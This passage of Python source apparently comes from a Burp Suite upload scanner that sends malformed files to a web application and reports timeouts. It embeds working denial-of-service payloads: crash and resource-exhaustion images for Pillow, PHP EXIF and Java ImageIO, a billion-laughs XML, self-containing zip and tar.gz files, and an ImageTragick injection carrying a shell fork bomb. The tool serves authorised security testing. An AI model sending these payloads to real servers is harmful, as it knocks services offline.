                      'iS0dEAIgFHUgAAACfSURBVCjPfdHBEcMgDETRTEpIBcnfDrRUYFRB+i8mB7BsOIQT82alQeLx5vX8cJ3HeVHIC7QelbDDzoSYEIDS9gotW' \
                      '/8HhLwCKL0C1gbIt4cBzIRmwidE4CUx3nHcSgzwBTlG4mwSBZ4bqX3Ith0qCHVoHapHy1B2aha1zMyMqB45gEpsYA842Epu4MyWvj5KY0L' \
                      'twA7XLNjWaLHuVOAH7HBQQpH5l3oAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAHBQQ' \
                      'puxU4EAAAAJSURBVAAACxIAAHBQQpuxU4EAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxI' \
                      'AAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAHBQQpuxU4EAAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBV' \
                      'AAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSAe6P6Z0AAAAJSURBVAAACxIAAAsSQgFa+bcAAAAJSURBVAAACxIAAAsSQgFa+bcAAAA' \
                      'KSURBVAAACxILEgHVfvzLRAATAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQDAAAACklEQVTG5kw1AAAACUlEQVQAAAsSAAALEkIBW' \
                      'vm3AAAACUlEQVQAxcl5Re5BjpETPW6DAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAB' \
                      'wUEKbsVOBAAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEgHuj+mdAAAACUlEQVQAA' \
                      'AsSAAALEkIBWvm3AAAACUlEQVQAAAsSAAALEkIBWvm3AAAACklEQVQAAAALEgAACxJCgKuXlgAAAAlJREFUAAALEgAACxJCAVr5twAAAAl' \
                      'JREFUAAALEgAACxIB7o/pnQAAAAlJREFUAAALEgAACxJCAVr5twAAAAlJCxJ+/AAA'
            content = content.decode("base64")
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). "
            desc_pil += "It usually leads to a Python exception of:<br>broken PNG file (chunk b'\xe5\xe6')<br>"
            desc_pil += "Our test server then returned an HTTP 500 error."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary.png", content, "image/png", new_title, desc_pil))

        if injector.opts.file_formats['ico'].isSelected():
            content = '\x00\x00\x01\x00\x01\x00  \x10\x00\x01\x00\x04\x00\xe8\x02\x00\x00\x16\x00\x00\x00(\x00\x00\x00\x01\x00\x00' \
                      '\x00@\x00\x00\x08\x01\x00\x18\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00\x04\x00\xe8\x02\x00\x00\x00\xe8=====' \
                      '=====================================================9====================================================' \
                      '========================333\x0333\x03333333330333\x0333\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb\xdb' \
                      '\xdb\xdb\xdb\xdb\xdb'
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). " \
                              "On my machine this takes more than 25 seconds to process. The .ico image routine seems to be used in Pillow 4.0.0."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary2.ico", content, "image/vnd.microsoft.icon", new_title, desc_pil))
                if orig_ct:
                    attacks.append(("pythonImageLibrary3.ico", content, "image/x-icon", new_title, desc_pil))

        if injector.opts.file_formats['tiff'].isSelected():
            content = 'II*\x00\xa0\x00\x00\x00\x80?\x01P8$\t\x86\xc0\x82\xd6\xc2\x83\xf8\x1b\xc0\x06\x00*\xbf\xe1\x8f\xf7\x9b\xfd\xf7\x00' \
                      '\x00\xf9\x00\x00\x00\r\x01\x02\x00\x08\x00\x00\x00\x9f\x01\x00\x00\x11\x01\xe5\x00\x01\x00\x00\x00\x08\x00\x00\x00' \
                      '\x122\xf7\xfb\x0e\x06\x0f\x9a\x0c\xde\x109\xa4l\xfe\xff\x9aL\x97\xef\xc0\x1c\t\xf9\x1a\xa2\xc5\xa5\x93X#\x00\x00' \
                      '\x00\x1eA\x07\x84\xf7\x89>R\xfc\x18\x94\xd8\xa4\xfa[\xcd\x82U*\x94\xe2o\xf6-\x80\xa7\x03y\xd9l0\xd6-\x80\xaf\x04' \
                      '\xb5[\xe6%P\xa8\x02\t/\x1f\xbf.\xf1(-\xe2S\x02x\x00\x18\x14\xb8L\n\x02\x12\x00\x00\x01\t\x00\x01\x00\x00\x00 \x00' \
                      '\x00\x08\x01\x01\x01\x00\xe5\x00\x00\x00 \x00\x00\x00\x02\x01\x03\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x01\x03' \
                      '\x01\x01\x00\x00\x00\x05\x00\x00\x00\n\x01\x03\x00\x01\x00\x00\x00\x03\x00\x00\x00\n\x01\x03\x00\x01\x00\x00\x00' \
                      '\x01\x00\x00\x00\r\x01\x02\x00\x08\x1f\x01\x00~\x01\x00\x00\x11\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00\x12' \
                      '\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x15\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00\x16\x01\x05\x00\x01' \
                      '\x00\x00\x00\x86\x01\x00\x00\x1b\x03\x00\x01\x00\x00\x00\x01\x03\x00\x01\x00\x00\x00\x00\x04\x00\x00\x17\x01\x04' \
                      '\x00\x01\x00\x00\x00\x98\x00\x00\x00\x1a\x01\x05\x00\x01\x00\x00\x00\x86\x01\x00\x00\x1b\x01\x05\x00\x01\x00\x00' \
                      '\x00\x8e\x01\x00\x00\x1c\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00(\x01\n\x00\x01\x00\x00\x00\x01\x00\x00\x00)' \
                      '\x01\x03\x00\x02\x00\x00\x00\x00\x00\x01\x00@\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x9d\x80'
            desc_pil = desc + "The file was created by floyd during an offline fuzzing run with the Python Image Library (PIL/Pillow). " \
                              "On my machine this takes a long time and uses a lot of memory (RAM). Pillow 4.0.0."
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_pil))
            if orig_filename or orig_ct:
                attacks.append(("pythonImageLibrary2.tiff", content, "image/tiff", new_title, desc_pil))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '\xff\xd80\x00\x1000000000000000\xe1\x00xExif\x00\x00MM\x00*\x00\x00\x00p00000000000000000000000000000000000' \
                      '000000000000000000000000000000000000000000000000000000000000000000000'
            desc_php = desc + "The file was found by Hanno Boeck during a fuzzing run with PHP. " \
                              "See details on https://blog.fuzzing-project.org/43-PHP-EXIF-parser-out-of-bounds-reads-" \
                              "CVE-2016-4542,-CVE-2016-4543,-CVE-2016-4544-and-a-note-on-custom-memory-allocators.html . "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164543.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00\\Exif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x060000\x00\x00\x00\x01000' \
                      '00000\x00\x00\x00\x0100000000\x00\x00\x00\x0100000000\x00\x00\x00\x0400000000\x00\x00\x00\x0100000000\x00' \
                      '\x00\x00\x00000000'
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164543.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00xExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x060000\x00\x00\x00\x010000' \
                      '0000\x00\x00\x00\x0100000000\x00\x00\x00\x0100000000\x00\x00\x00\x0400000000\x00\x00\x00\x010000\x82\x9800' \
                      '\x00\x00\x00\t\x00\x00\x00f000000000000000000000000\x0000000'
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164542.jpeg", content, "image/jpeg", new_title, desc_php))

            content = '\xff\xd80\x00\x1000000000000000\xe1\x00\x0cExif\x00\x00MM00'
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_php))
            if orig_filename or orig_ct:
                attacks.append(("CVE20164544.jpeg", content, "image/jpeg", new_title, desc_php))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = '\xff\xd8\xe1\xff\x01\x00\x00\x00'
            desc_java = desc + "The file was found by Rody Kersten during a fuzzing run with Java ImageIO with his " \
                               "AFL-based Kelinci Java fuzzer. See details on https://github.com/isstac/kelinci " \
                               "https://issues.apache.org/jira/browse/IMAGING-203 and " \
                               "http://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8188756. "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_java))
            if orig_filename or orig_ct:
                attacks.append(("IMAGING-203.jpeg", content, "image/jpeg", new_title, desc_java))

        if injector.opts.file_formats['jpeg'].isSelected():
            content = 'eJz7f+P/AwYBLzdHBwZGRiYGGSBk+H+bwZlBQ0ZOWU5Sg1dRWVdbw8AmxdHG3Nzmf0SsZ8rEhpnT+ht6uhZseXa4f9WttV09J/6fvvXu6////2cffPH//6//z/7+/wEyhFFbV9fG1KbM37Hsx9KepT9wA+' \
                      'vd1tjA/wMMghwsCgwKzIyODEwijMyKjP+PsPw/wqAqwMDExMjCyMzKAAWMTMyCDCxCioZKjoGFwiLGiQuBysQYgYABBTAyAcWlBBkZmJghMr9g4oJCSo7/bzHwAMWZBIGG2TOElRse3SHA25i+MG1Tce0' \
                      'pBYa1klpuJAIPBNOKkFpdMBlOlLnGSOwwGOMCVqWamEJQHSoErfEgqAILCCOsBCtwJaykHsZIcIMlT6hAhptbKLrqRBymAJPqf3IcCAVOxChCJLn/H9HSIFHg/z0yNCEAB24paSKNYKHIAQwMK6G0IKZU' \
                      'PXYd2MMJ5A5EuGJP49iAKZhUiQZTDjiVAQuAX26QlK4HF0xAikiiLYQDT6yi6AEKEmpgwGZ8O5x1BUUcll+RcgEI2OF3TQg4Lf7/yIBhPTJwZMNvCmqqh5vChDXKvgEzGJwjiz2yKU7iuAEo8b8AMVCcT' \
                      'GF6RvYSKpAlJ3/jAu8R9nD8QpaAVLD/0SpYXMaAA/0XLlnKAVK45hNIOPgA3DxhBgZWZgZGWOWOQzUL1uyCG0Sj8DSw2t+AIejihtvfKABPIcsASjAMDHIgxn27GfJwUQF0ZdNm4Q5bN7cKPL5DBAdqzc' \
                      'fAiKkUHqK4C0K09hMei8FgST9z+u+ZoqaTbkR4paTaVk7wSru8pCVQef6cKwvVXe40PpbdGhpWcHWZ+tGt8u08uUJ5Kqzesh/PJmauq/J5tWRawLp3yWoNj95f+AgMHjyhOG2WmWtaSojustmvCg96Mfy' \
                      '5pt3063nf/5sAwnQt6A=='
            content = content.decode("base64").decode("zip")
            desc_java = desc + "The file was found by floyd during a fuzzing run with Java Apache Commons JPEG parser " \
                               "with the AFL-based Kelinci Java fuzzer. See details on " \
                               "https://issues.apache.org/jira/browse/IMAGING-215 "
            new_title = title
            attacks.append((orig_filename, content, '', new_title, desc_java))
            if orig_filename or orig_ct:
                attacks.append(("IMAGING-215.jpeg", content, "image/jpeg", new_title, desc_java))

        if injector.opts.file_formats['xml'].isSelected():
            content = '<?xml version="1.0"?><!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ELEMENT lolz (#PCDATA)> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> ' \
                      '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ' \
                      '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> ' \
                      '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> ' \
                      '<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ' \
                      ']> <lolz>&lol9;</lolz>'
            new_title = title
            desc_lol = desc + "The billion laughs attack, see https://en.wikipedia.org/wiki/Billion_laughs ."
            attacks.append((orig_filename, content, '', new_title, desc_lol))
            if orig_filename or orig_ct:
                attacks.append(("BillionLaughs.xml", content, "application/xml", new_title, desc_lol))
                if orig_ct:
                    attacks.append(("BillionLaughs.xml", content, "text/xml", new_title, desc_lol))

        if injector.opts.file_formats['zip'].isSelected():
            content = 'UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAlANr/UEsDBBQAAAAIAAgDZDz59IlkSAEAALgBAAAHAAAAci9yLnppcAAvAND/ACUA2v9QSwMEFAAAAAgACANkPPn0iWRIAQAAuAEAAAcAA' \
                      'AByL3IuemlwAC8A0P/CVI5XOQAFAPr/wlSOVzkABQD6/wAFAPr/ABQA6//CVI5XOQAFAPr/AAUA+v8AFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAAAP//AAAA/' \
                      '/8ANADL/0KIIcQAAAAA//8AAAD//wA0AMv/QughXg8AAAD//wrwZmQSYcAV3OigSL9IryqzIMCblQ3EZwRCUwYGBkAABgD5/20BAAAAAELoIV4PAAAA//8K8GZkEmHAFdzooEi/SK8qsyDAm5UNxGcEQlMGB' \
                      'gZAAAYA+f9tAQAAAABQSwECFAAUAAAACAAIA2Q8+fSJZEgBAAC4AQAABwAAAAAAAAAAAAAAAAAAAAAAci9yLnppcFBLBQYAAAAAAQABADUAAABtAQAAAAA='
            content = content.decode("base64")
            new_title = title
            desc_rzip = desc + "A zip file r.zip that contains itself. See https://research.swtch.com/zip ."
            attacks.append((orig_filename, content, '', new_title, desc_rzip))
            if orig_filename or orig_ct:
                attacks.append(("r.zip", content, "application/zip", new_title, desc_rzip))

        if injector.opts.file_formats['gzip'].isSelected():
            content = 'H4sIAAAAAAAAACrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3B5QFAAAA//8APADD/yrSL9IrSSzSS69ioBkwAAIzExMgbQ7hI4mbGhuB2YYo6k0MzcwZFGDqRgHtgHw3B' \
                      '5QFAAAA//8APADD/0LoJV0vAAUA+v9C6CVdLwAFAPr/AAUA+v8AFADr/0LoJV0vAAUA+v8ABQD6/wAUAOv/QoghxAAAFADr/0KIIcQAABQA6/9CiCHEAAAUAOv/QoghxAAAFADr/0KIIcQAAAAA//8AAAD//' \
                      'wAnANj/QoghxAAAAAD//wAAAP//ACcA2P/CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA///CVIZVGQAAAP//AAgA9/8PYlI2AAgAAGIYBaNgFIyCQQ0AAQAA//8PYlI2AAgAAA=='
            content = content.decode("base64")
            new_title = title
            desc_rgz = desc + "A tar.gz file r.tar.gz that contains itself. See https://research.swtch.com/zip ."
            attacks.append((orig_filename, content, '', new_title, desc_rgz))
            if orig_filename or orig_ct:
                attacks.append(("r.tar.gz", content, "application/gzip", new_title, desc_rgz))
                if orig_ct:
                    attacks.append(("r.tar.gz", content, "application/x-tar", new_title, desc_rgz))

        if injector.opts.file_formats['mvg'].isSelected():
            content = "push graphic-context\n" \
                      "viewbox 0 0 " + str(injector.opts.image_width) + " " + str(injector.opts.image_height) + "\n" \
                      "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "`:(){ :|:& };:`)'\npop graphic-context"
            new_title = title
            desc_fork_bomb = desc + "An ImageTragick CVE-2016-3714 injection with a fork bomb as a payload."
            attacks.append((orig_filename, content, '', new_title, desc_fork_bomb))
            if orig_filename or orig_ct:
                attacks.append(("image.jpeg", content, "image/jpeg", new_title, desc_fork_bomb))

        for filename, content, content_type, title, desc in attacks:
            req = injector.get_request(filename, content, content_type)
            if req:
                resp = burp_extender._make_http_request(injector, req, report_timeouts=False)
                if not resp:
                    # connection timeout occured
                    base_request_response = injector.get_brr()
                    brr = CustomRequestResponse("", "", base_request_response.getHttpService(),
                                                req, None)
                    csi = burp_extender._create_issue_template(brr, title, desc, "Tentative", "Medium")
                    burp_extender._add_scan_issue(csi)
